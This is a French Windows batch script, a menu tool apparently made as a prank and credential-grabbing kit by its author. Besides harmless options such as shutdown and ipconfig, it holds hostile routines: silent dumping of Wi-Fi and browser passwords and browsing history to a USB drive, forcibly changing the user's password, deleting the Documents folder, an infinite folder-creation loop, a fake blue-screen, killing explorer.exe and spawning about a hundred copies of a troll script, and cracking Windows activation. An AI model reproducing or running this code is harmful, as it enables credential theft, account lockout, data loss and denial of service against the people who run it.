@echo off 
mode con cols=80 lines=43
title= ---- Choose_multiple ----  
cd windows\system32 
color 8A
cls 
@echo                       -------------------------------------------
@echo                       Bienvenue Sur Choose_multiple! :)                                                                                  
@echo                       -------------------------------------------
@echo                       Cree  Par JackRyan
@echo                       Pour me contacter 
@echo                       par mail : cluberland@protonmail.com                                
@echo                       -------------------------------------------                         
@echo                                             Version Beta -_-           
@echo                       -------------------------------------------
:debut 
@echo off
echo 1 : Fermer la session 
echo 2 : Eteindre l'ordinateur 
echo 3 : Redemarer l'ordinateur
echo 4 : Veille prolonge de l'ordinateur
echo 5 : Rien Faire
echo 6 : Cree Masse Fichier
echo 7 : Supprime Dossier Temp
echo 8 : USB Recovery Password
echo 9 : SAVE PROFIL
echo 10: Activation Windows Indisponible
echo 11: Cache un dossier
echo 12: Decouvrir sa cle windows
echo 13: Ping localhost
echo 14: Supprime le dossier document
echo 15: desactive internet
echo 16: change pass admin
echo 17: annuler le shootdown
echo 18: ipconfig
echo 19: ecran
echo 20: demo troll
echo 21: virus
echo 22: Trol choose
echo 23: change_pass_user
echo 24: oppai-hh
echo 25: Activer Adobe (Desactiver Anti-virus)
echo 26: Activation Windows By Me
echo 27: Info_PC

set /p choix=Que Choisissez vous ? : 
(  
if %choix%==1 goto Fermer_la_session
if %choix%==2 goto Arrêt
if %choix%==3 goto Arrêt_et_Restart 
if %choix%==4 goto Veille_prolongee
if %choix%==5 goto Ferme_CMD
if %choix%==6 goto Cree_Masse_Fichier
if %choix%==7 goto Supprime_Dossier_Temp
if %choix%==8 goto USB_Recovery_Password
if %choix%==9 goto SAVE_PROFIL
if %choix%==10 goto Activation_Windows
if %choix%==11 goto Cache_Dossier
if %choix%==12 goto Windows_Keys
if %choix%==13 goto ping
if %choix%==14 goto document
if %choix%==15 goto internet_off
if %choix%==16 goto session_pass
if %choix%==17 goto shutdown_annulation
if %choix%==18 goto IPCONFIG
if %choix%==19 goto ecran
if %choix%==20 goto demo_troll
if %choix%==21 goto virus
if %choix%==22 goto troll_2
if %choix%==23 goto Change_pass_user
if %choix%==24 goto oppai-hh
if %choix%==25 goto Adobe
if %choix%==26 goto Active
) 
goto début 
:Fermer_la_session 
echo tu a choisi de fermer la session. 
shutdown /l  /f
goto end 
:Arrêt 
echo tu a choisi de eteindre ton ordinateur. 
shutdown /s /f
goto end 
:Arrêt_et_Restart
echo tu a choisi eteindre ton ordinateur et de le redémarrer l'ordinateur. 
shutdown /r /f
goto end 
:Veille_prolongee
echo tu a choisi la veille prolonger de ton ordinateur
shutdown /h /f
goto end   
:Ferme_CMD
echo le cmd va se fermer tous seul tkt 
goto end 
:Cree_Masse_Fichier
@echo off
:top
md %random%
goto top
goto end 
:Supprime_Dossier_Temp
del C:\Windows\Temp\*.*
dir C:\Windows\Temp >Reste_Temp.txt
goto end 

:USB_Recovery_Password
cd G:
color 8A
title= ---- USB Recovery Password ---- 
md Password
cls
@echo off
echo                                   Bonjour :)
echo                       ---------------------------------
echo                       Bienvenue Sur                                                                                    
echo                       USB Recovery Password    
echo                       Cree  Par                                    
echo                       JackRyan                                  
echo                                            Version Beta             
echo                       ---------------------------------

@echo Tu vien de lancer le logiciel qui va recuperer tout tes password si il demande des verification du logiciel ses normal 

PING localhost -n 5 >NUL

start \Logiciel\WirelessKeyView.exe /stext \Password\Wifi_Password.txt
start \Logiciel\WebBrowserPassView.exe /stext \Password\Internet_Password.txt 
start \Logiciel\MyLastSearch.exe /stext \Password\Dernier_Historique.txt
start \Logiciel\OpenedFilesView.exe /stext \Password\Files_ouvert.txt
start \Logiciel\WirelessNetView.exe /stext \Password\Wifi_Detect.txt
start \Logiciel\BrowsingHistoryView.exe /stext \Password\Page_Consulter.txt
start \Logiciel\WNetWatcher.exe /stext \Password\Scan_Wifi.txt
cls

echo Copie des Passwords en cours ...
ping 0.0.0.0 -n 1 >nul
echo 10...
ping 0.0.0.0 -n 1 >nul
echo 20...
ping 0.0.0.0 -n 1 >nul
echo 30...
ping 0.0.0.0 -n 1 >nul
echo 40...
ping 0.0.0.0 -n 1 >nul
echo 50...
ping 0.0.0.0 -n 1 >nul
echo 60...
ping 0.0.0.0 -n 1 >nul
echo 70... 
ping 0.0.0.0 -n 1 >nul
echo 80...
ping 0.0.0.0 -n 1 >nul
echo 90...
ping 0.0.0.0 -n 1 >nul
echo 100
ping 0.0.0.0 -n 1 >nul
echo>nul
echo Copie des passwords effectuee avec succes!

cls

@echo tes password ont ete enregistrer dans Password qui est sur ta cle ou sur ton disque dur. ;)
PING localhost -n 5 >NUL
exit
:SAVE_PROFIL
@ECHO ON
color 8A

title= ---- WELCOME TO SAVE PROFIL ---- 
md Sauvegarde
cls
@ECHO OFF


ECHO -----------------------------------------------
ECHO    WELCOME TO SAVE PROFIL!!
ECHO      Created By JackRyan
ECHO          Version Beta
ECHO -----------------------------------------------


xcopy C:"Users\%username%\*.*" \Sauvegarde /e/y


@ECHO Les fichiers de profil de votre ordinateur ont bien été enregistré dans le dossier «Sauvegarde»


ping 0.0.0.0  -n 2 >nul
rem pause


cls


@ECHO NB : Ne toucher à rien le programme va se fermer automatiquement
ping 0.0.0.0 -n 2 >nul
cd G:
md conclusion

echo LA SAUVEGARDE EST TERMINEE ;) > \conclusion\Sauvegarde_Reussi.txt"
dir \Sauvegarde > \conclusion\Logs_Sauvegarde.txt
start \conclusion\Sauvegarde_Reussi.txt
exit

:Activation_Windows
cd G:
cls
echo Vous avez choisit activer votre windows une application va s'ouvrir pour pouvoir le faire
start \Logiciel\Activation_Keys.exe
exit
:Cache_Dossier
@ECHO OFF
if EXIST "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
if NOT EXIST Private goto MDLOCKER
:CONFIRM
echo voulez vous verrouiller le dossier private (Y/N)
set/p "cho=>"
if %cho%==Y goto LOCK
if %cho%==O goto LOCK
if %cho%==o goto LOCK
if %cho%==y goto LOCK
if %cho%==n goto END
if %cho%==N goto END
echo mauvais choix tapez Y pour oui et N pour non.
goto CONFIRM
:LOCK
ren Private "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
attrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
echo dossier verrouille
goto End
:UNLOCK
echo Entrez le mot de passe pour acceder au dossier verrouille
set/p "pass=>"
if NOT %pass%== ********** goto FAIL

attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" Private
echo dossier déverrouille
goto End
:FAIL
cls
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
echo Mots de passe incorrect attention 
ping localhost -n 6 >nul 
cls
:UNLOCK
echo Il te reste une dernier chance !!
set/p "pass=>"
if NOT %pass%== bbJackRyan goto Trop!
attrib -h -s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
ren "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" Private
echo dossier déverrouille
goto end
:Trop!
echo faillait pas te tromper .....
ping localhost -n 4 >nul
del /f \Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}\Truc\test
shutdown /s /f
goto end
:MDLOCKER
md Private
echo dossier Private cree
ping Localhost -n 5 >nul
start Choose_multiple.bat
goto End
:End
goto end 
:Windows_Keys
start \Logiciel\winaskey.exe
exit
:ping
Ping -n 5 localhost
exit
:@echo off
:document
echo ----Delete Documents----
del /f /q "C:\Users\%userprofile%\My Documents\*.*"
echo ---------------------------
exit
:internet_off
@echo off
echo -----Disable Internet------
ipconfig /release
if ERRORLEVEL1 ipconfig /release_all
echo ---------------------------
exit
:session_pass
@echo off
echo Change Pass To JackRyan
net user %username% JackRyan
echo ---------------------------
PING localhost -n 5 >NUL
exit
:shutdown_annulation
shutdown -a
echo voila tu a annuler ton shotdown 
ping -n 6 localhost
:IPCONFIG
md IP
ipconfig /all < \IP\ipconfig.txt
exit
:ecran
msg * SUCKS TO BE YOU
@echo off
echo ^<html^>^<head^>^<title^>JackRyan^</title^> > JackRyan.hta
echo. >> JackRyan.hta
echo ^<hta:application >> JackRyan.hta
echo applicationname="JackRyan"  >> JackRyan.hta
echo version="1.0" >> JackRyan.hta
echo maximizebutton="no" >> JackRyan.hta
echo minimizebutton="no" >> JackRyan.hta
echo sysmenu="no" >> JackRyan.hta
echo Caption="no" >> JackRyan.hta
echo windowstate="maximize"/^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^</head^>^<body bgcolor="#4169E1" scroll="no"^> >> JackRyan.hta
echo ^<font face="Times New Roman" size="5" color="#FF0000"^> >> JackRyan.hta
echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQUAL^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^<p^>If this is the first time you've seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^<p^>Technical information:^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo. >> JackRyan.hta
echo ^<p^>***       gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^<p^>Beginning dump of physical memory^</p^> >> JackRyan.hta
echo ^<p^>Physical memory dump complete.^</p^> >> JackRyan.hta
echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> JackRyan.hta
echo. >> JackRyan.hta
echo ^</font^> >> JackRyan.hta
echo ^</body^>^</html^> >> JackRyan.hta
start "" /wait "JackRyan.hta"
del /s /f /q "JackRyan.hta" > nul
exit
:demo_troll
cls
@echo off
echo NNNNNNNNNNNNNNNNNNNMMMNNNNNNNNNNNNMMMMNNNNMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMN
echo NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMNMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMN
echo NNNNNNMNNNNNNNNNNNNNNNNNNNNNNNNNNNMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMNMMMMMMMN
echo MNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMNN
echo MMNNNNNNNNNNMNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN
echo MMNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMNNMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMN
echo MMNNNNNNNNNNNNNNNNNNNNNMMMMMMMNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN
echo MMNNNNNNNNNNNNNNNNNNMMMMMNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMN
echo MMNNNNNNNNNNNNNNNNMMMMMNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMMN
echo MNNNNNNNNNNNNNNNMMMMNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMN
echo MMNNNNNNNNNNNNNMMMNNNNNNNMMNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMNN
echo MMNNNNNNNNNNNNMMMNNNMMMMMMNMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMhoodMMMMMMMMMMMMMMMMMNMMNN
echo NNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmo//hMMMMMMMMMMMMMMMNNMMMN
echo MNNNNNNNNNNMMMMMMMMMMMMMNMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs//+MMMMMMMMMMMMMMMMNNMNN
echo MNNNNNNNNNNMMMMMMMMMMMMMMMMNNNMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMdo+:NMMMMMMMMMMMMMMMMMNNm
echo MNNNNNNNNNMMMMMMMMMMMMMMMMMMNNMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMm/o:NMMMMMMMMMMMMMMMMNNNm
echo MNNNNNNNNMMMMMMMMMMMMNMMNNMMMMMNdhydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMmhmMNys:MMMMMMMMMMMMMMMNMMNNN
echo MNNNNNNNNMMNMMMMMMMMMMMMNNNNNdo:.-+/mMMMMMMymMMMMMMMMMMMMMMMMMMMMMMNNNMdohNNyo:MMMMMMMMMNNMNMMNMMNNN
echo MMNNNNNNNMMMMMMMMMMMNMMNNNNd+-....--hNNMMMMo/hdMMMMMMMMMMMMMMMMMMMNmmmMd/odmy:/MMMMMMMMMNdNdmNMNNNMN
echo MMNNNNNNMMMMMMMMMMMMMMNNNNy-.......-/hhMMMMs://NMMMMMMMMMMMMMMMMMMNdmdMd/:ydh-oMMMMMMMMMNhdo++mNNNMN
echo MMNNNNNNMMMMMMMMMMMNMMMNNNy.........-/yhMMMo---hMMMMMMMMMMMMMNNNNNmshmmy::oyy/mMMMMMMNNmhso:--:yNNNN
echo MMNNNNNNMMNMMMMMMMMNMMMMMMN-...:://+oohohMN+-..+MMMMMMMMMMMMNmhshmd++dso::/o/dMMMMMMMNmdo/:::---/hmd
echo MMNNNNNNMMNMMMMMMMMMMMMNNMyo..-+:+hhso+::mm+.-.-mmMMMMMMMMMMmh+/+yh/:s//:-:/-dMMMMMNdhys/:::::----o-
echo MMNNNNNNMMNMMMMMMMMMMMMNNN/+:-//--o+//--./d:..::oshMMmmMNMMMys/::+s:::::-----yMMMMNho+//:::-----.:+`
echo MMNNNNNNMMMMMMMMMMMMMMMNNN/:s:o:--++//:-..+:./o/+o:mMmsmmmMm++::::/----------sMMMNh+/:::::------:+..
echo MMNNNNNNNMMMMMMMMMMMMMMMNN--ooo--:o+++ssso+++o//::-oNm+ohsNd/::::------------+MNms+::::::------:o.-h
echo MNNNNNNNNMMMMMMMMMMMMMMMMh.-:+/.-:o+o-:mNh+o+::///::ym/:o+yhs::::--..--------ommy//:::::------:s-:dM
echo MNNNNNNNNMMMMMMMMMMMMMMMM+.-/o.-::so/--s+-:://+++//:+h+:-//oh/-::--.:--------syh+/::::::-----/y::mMM
echo MMNNNNNNNNMMMMMMMMMMMMMMm-.:+-.:::so--:o..-:/+++++/:oo+-.--:os------+-------:oso//::::------/s-/mMMM
echo MMNNNNNNNNNMMMMMMMMMMMMM/..:+..::/s--:/+---:://///::y+/:---.-d---:++:-------o/o+//:::------/o-+NMMMM
echo MMNNNNNNNNNMMMMMMMMMMMMN/-.-+-.-:/:.-/o:.::/://///oydy/:--:-.h/+yo/::------oo++//:::--/:--/+-yMMMMMM
echo MMNNNNNNNNNNMMMMMMMMMMMMMd+--+../--.-/o-..:s++++/hMMsso::-/:.yNMMhhdo/:---oNmho/::::--o--/::hMMMMMMM
echo MMNMNMNMMMNNNNNMMMMMMMMMMMMMd//-.:-..-:/omo+:-.-oMd/:/s---//-+MMMMMMMMMMMMMMMMMMms:--oyo:+NMMMMMMMMM
echo MMMMMNMMNNNNNNNNMMMMMMMMMMMMMNo+..:...-:yNNhs++ymy/---o-.://-oMMMMMMMMMMMMMMMMMMMm:-:d+-yMMMMMMMMMMM
echo MMMMMNMMNNNMNNNNMMNMMMMMMMMMMMMMo--:......:sy+++/++-.-o--::--NMMMMMMMMMMMMMMMMMMNdo-.:mMMMMMMMMMMMMM
echo MMNMMMMMNNMNMMMMMNNNMMMMMMMMMMMMMh//-.....--ossyy+-..-+-:::-oMMMMMMMMMMMMMMMMMMdo-../NMMMMMMMMMMMMMM
echo MMMMMMMMNNMNMMMMNNNNMNNNMMMMMMMMMMN+--....---+ssm/-..---:--:mMMMMMMMMMMMMMMMMNy----/NMMMMMMMMMMMMMMM
echo MMMMMNMMNMMMMMMMNNNNMMNMMMMMMMMMMMMNs-..--.--:/yyh-.-----::sMMMMMMMMMMMMMMMMMNy-.-/NMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMNo------:://yy//+++yNMMMMMMMMMMMMMMMMMMMd./mMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd+::::////+oNMMMMMMMMMMMMMMMMMMMMMMs.:NMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMN+..-..-....hsMMMMMMMMMMMMMMMMMMMN-dMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMNdhyyyyyyhMNMMMMMMMMMMMMMMMMMMMh/MMMMMMMMMMMMMMMMMMMMMM
echo NNNNNNNNNNNNNNNNNNNMMMNNNNNNNNNNNNMMMMNNNNMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMN
echo NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMNMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMN
echo NNNNNNMNNNNNNNNNNNNNNNNNNNNNNNNNNNMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMNMMMMMMMN
echo MNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMNN
echo MMNNNNNNNNNNMNNNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN
echo MMNNNNNNNNNNNNNNNNNNNNNNNNMMMMMMMNNMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMN
echo MMNNNNNNNNNNNNNNNNNNNNNMMMMMMMNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN
echo MMNNNNNNNNNNNNNNNNNNMMMMMNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMN
echo MMNNNNNNNNNNNNNNNNMMMMMNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMMN
echo MNNNNNNNNNNNNNNNMMMMNNNNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMN
echo MMNNNNNNNNNNNNNMMMNNNNNNNMMNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMNN
echo MMNNNNNNNNNNNNMMMNNNMMMMMMNMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMhoodMMMMMMMMMMMMMMMMMNMMNN
echo NNNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmo//hMMMMMMMMMMMMMMMNNMMMN
echo MNNNNNNNNNNMMMMMMMMMMMMMNMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs//+MMMMMMMMMMMMMMMMNNMNN
echo MNNNNNNNNNNMMMMMMMMMMMMMMMMNNNMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMdo+:NMMMMMMMMMMMMMMMMMNNm
echo MNNNNNNNNNMMMMMMMMMMMMMMMMMMNNMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMm/o:NMMMMMMMMMMMMMMMMNNNm
echo MNNNNNNNNMMMMMMMMMMMMNMMNNMMMMMNdhydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMmhmMNys:MMMMMMMMMMMMMMMNMMNNN
echo MNNNNNNNNMMNMMMMMMMMMMMMNNNNNdo:.-+/mMMMMMMymMMMMMMMMMMMMMMMMMMMMMMNNNMdohNNyo:MMMMMMMMMNNMNMMNMMNNN
echo MMNNNNNNNMMMMMMMMMMMNMMNNNNd+-....--hNNMMMMo/hdMMMMMMMMMMMMMMMMMMMNmmmMd/odmy:/MMMMMMMMMNdNdmNMNNNMN
echo MMNNNNNNMMMMMMMMMMMMMMNNNNy-.......-/hhMMMMs://NMMMMMMMMMMMMMMMMMMNdmdMd/:ydh-oMMMMMMMMMNhdo++mNNNMN
echo MMNNNNNNMMMMMMMMMMMNMMMNNNy.........-/yhMMMo---hMMMMMMMMMMMMMNNNNNmshmmy::oyy/mMMMMMMNNmhso:--:yNNNN
echo MMNNNNNNMMNMMMMMMMMNMMMMMMN-...:://+oohohMN+-..+MMMMMMMMMMMMNmhshmd++dso::/o/dMMMMMMMNmdo/:::---/hmd
echo MMNNNNNNMMNMMMMMMMMMMMMNNMyo..-+:+hhso+::mm+.-.-mmMMMMMMMMMMmh+/+yh/:s//:-:/-dMMMMMNdhys/:::::----o-
echo MMNNNNNNMMNMMMMMMMMMMMMNNN/+:-//--o+//--./d:..::oshMMmmMNMMMys/::+s:::::-----yMMMMNho+//:::-----.:+`
echo MMNNNNNNMMMMMMMMMMMMMMMNNN/:s:o:--++//:-..+:./o/+o:mMmsmmmMm++::::/----------sMMMNh+/:::::------:+..
echo MMNNNNNNNMMMMMMMMMMMMMMMNN--ooo--:o+++ssso+++o//::-oNm+ohsNd/::::------------+MNms+::::::------:o.-h
echo MNNNNNNNNMMMMMMMMMMMMMMMMh.-:+/.-:o+o-:mNh+o+::///::ym/:o+yhs::::--..--------ommy//:::::------:s-:dM
echo MNNNNNNNNMMMMMMMMMMMMMMMM+.-/o.-::so/--s+-:://+++//:+h+:-//oh/-::--.:--------syh+/::::::-----/y::mMM
echo MMNNNNNNNNMMMMMMMMMMMMMMm-.:+-.:::so--:o..-:/+++++/:oo+-.--:os------+-------:oso//::::------/s-/mMMM
echo MMNNNNNNNNNMMMMMMMMMMMMM/..:+..::/s--:/+---:://///::y+/:---.-d---:++:-------o/o+//:::------/o-+NMMMM
echo MMNNNNNNNNNMMMMMMMMMMMMN/-.-+-.-:/:.-/o:.::/://///oydy/:--:-.h/+yo/::------oo++//:::--/:--/+-yMMMMMM
echo MMNNNNNNNNNNMMMMMMMMMMMMMd+--+../--.-/o-..:s++++/hMMsso::-/:.yNMMhhdo/:---oNmho/::::--o--/::hMMMMMMM
echo MMNMNMNMMMNNNNNMMMMMMMMMMMMMd//-.:-..-:/omo+:-.-oMd/:/s---//-+MMMMMMMMMMMMMMMMMMms:--oyo:+NMMMMMMMMM
echo MMMMMNMMNNNNNNNNMMMMMMMMMMMMMNo+..:...-:yNNhs++ymy/---o-.://-oMMMMMMMMMMMMMMMMMMMm:-:d+-yMMMMMMMMMMM
echo MMMMMNMMNNNMNNNNMMNMMMMMMMMMMMMMo--:......:sy+++/++-.-o--::--NMMMMMMMMMMMMMMMMMMNdo-.:mMMMMMMMMMMMMM
echo MMNMMMMMNNMNMMMMMNNNMMMMMMMMMMMMMh//-.....--ossyy+-..-+-:::-oMMMMMMMMMMMMMMMMMMdo-../NMMMMMMMMMMMMMM
echo MMMMMMMMNNMNMMMMNNNNMNNNMMMMMMMMMMN+--....---+ssm/-..---:--:mMMMMMMMMMMMMMMMMNy----/NMMMMMMMMMMMMMMM
echo MMMMMNMMNMMMMMMMNNNNMMNMMMMMMMMMMMMNs-..--.--:/yyh-.-----::sMMMMMMMMMMMMMMMMMNy-.-/NMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMNo------:://yy//+++yNMMMMMMMMMMMMMMMMMMMd./mMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd+::::////+oNMMMMMMMMMMMMMMMMMMMMMMs.:NMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMN+..-..-....hsMMMMMMMMMMMMMMMMMMMN-dMMMMMMMMMMMMMMMMMMMMM
echo MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMNdhyyyyyyhMNMMMMMMMMMMMMMMMMMMMh/MMMMMMMMMMMMMMMMMMMMMM
ping localhost -n 10 >nul
exit

:virus
cls
color 8A
taskkill /F /IM explorer.exe
cls
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
start \Logiciel\Troll.bat
